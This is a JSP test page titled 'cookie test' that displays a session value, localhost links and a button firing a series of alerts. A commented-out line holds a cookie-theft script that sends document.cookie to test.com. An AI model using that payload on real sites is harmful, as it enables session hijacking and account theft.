<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ include file="/WEB-INF/jsp/include/taglib.jsp"%>
<%@ page session="false" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>cookie test</title>
</head>
<body>
	session value：${session}
	url：<a href="<%=response.encodeUrl("http://localhost:8080/cookie/test")%>"><%=response.encodeUrl("http://localhost:8080/cookie/test")%></a>
	url：<a href="http://localhost:8080/cookie/test">http://localhost:8080/cookie/test</a>
	url：${url}
	
	<%--<script>window.open("http://www.test.com?cookie="+document.cookie)</script>--%>
	<%--<script>window.open("http://www.youku.com")</script>--%>
	<button id="but1">but1</button>
</body>

<script type="text/javascript">
	document.getElementById("but1").onclick = function(){
		alert(1);
		alert(2);
		alert(3);
		alert(4);
		alert(5);
		alert(6);
		alert(7);
	}
</script>
</html>